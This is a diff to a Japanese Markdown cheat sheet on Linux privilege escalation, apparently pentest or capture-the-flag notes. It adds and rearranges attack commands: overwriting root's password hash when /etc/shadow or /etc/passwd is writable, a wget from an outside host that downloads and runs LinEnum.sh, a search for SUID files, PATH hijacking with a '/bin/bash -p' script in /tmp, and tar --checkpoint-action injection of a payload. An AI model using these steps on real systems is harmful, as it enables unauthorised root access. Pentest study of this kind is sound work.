@@ -5,21 +5,9 @@
 2. ファイルの確認
 3. sudoの確認
 
-## 機密ファイルのパーミッション確認
-### /etc/shadow
-通常rootユーザーのみ読み取り可能。しかしもし書き込み可能な場合、新しいパスワードハッシュを生成し、rootユーザーのハッシュを上書きする。
-
-新しいパスワードハッシュの生成
+## root権限で実行可能なコマンドの確認
 ```
-mkpasswd -m sha-512 [NEW PASSWORD]
-```
-
-### /etc/passwd
-通常全てのユーザーが読み取り可能だが、書き込みはrootユーザーのみ可能。しかしもし書き込み可能な場合、rootユーザーのパスワードを上書きする。
-
-新しいパスワードの生成
-```
-openssl passwd [NEW PASSWORD]
+sudo -l
 ```
 
 ## ユーザー環境から継承された環境変数の確認
@@ -88,20 +76,46 @@ LD_LIBRARY_PATH : 最初に共有オブジェクトを検索しに行くディ�
 COMMAND : sudoで実行できるコマンド。  
 setresuid() : Sets real and effective user IDs of the calling process
 
-## コマンドの確認
-root権限で実行できるコマンドの確認
-```
-sudo -l
-```
 
 ## ファイルの確認
+### 機密ファイルのパーミッション確認
+#### /etc/shadow
+通常rootユーザーのみ読み取り可能。しかしもし書き込み可能な場合、新しいパスワードハッシュを生成し、rootユーザーのハッシュを上書きする。
+
+新しいパスワードハッシュの生成
+```
+mkpasswd -m sha-512 [NEW PASSWORD]
+```
+#### /etc/passwd
+通常全てのユーザーが読み取り可能だが、書き込みはrootユーザーのみ可能。しかしもし書き込み可能な場合、rootユーザーのパスワードを上書きする。
+
+新しいパスワードの生成
+```
+openssl passwd [NEW PASSWORD]
+```
+
 ### 怪しいスクリプトの調査
 1. LinEnumを実行
-2. CronTabに設定されているスクリプトの確認（相対パス or 絶対パス）
+2. CronTabに設定されているスクリプトの確認（コマンド名 or 絶対パス）
 3. SUID / SGIDファイルの確認
 4. その他ファイルの確認（一般ユーザーのホームディレクトリなど。LinEnumのInteresting Filesセクションも参考）
 
-### 内部コマンドの調査
+・LinEnumのダウンロード、実行
+```
+wget http://10.4.49.251/LinEnum.sh -O /tmp/LinEnum.sh; chmod +x /tmp/LinEnum.sh; sh /tmp/LinEnum.sh
+```
+
+・CronTabの確認
+```
+cat /etc/crontab
+```
+
+・全てのSUID / SGIDファイルの探索
+```
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+```
+
+### スクリプト内の実行コマンドの調査
 ・シェルスクリプトの場合
 ```
 cat [FILE]
@@ -120,7 +134,7 @@ strace [FILE] 2>&1 | grep -iE "open|access|no such file"
 ```
 
 ### 権限昇格の実行（コマンドの指定方法ごとに）
-・相対パスの場合  
+・コマンド名の場合  
 tmpディレクトリに同名のスクリプトを作成。
 ```
 echo '/bin/bash -p' | tee /tmp/[FILE]; chmod +x /tmp/[FILE]
@@ -164,7 +178,7 @@ touch [FILE PATH]--checkpoint=1
 touch [FILE PATH]--checkpoint-action=exec=[PAYLOAD]
 ```
 
-## sudoの確認
+## sudoのバージョン確認
 ```
 sudo -V
 ```
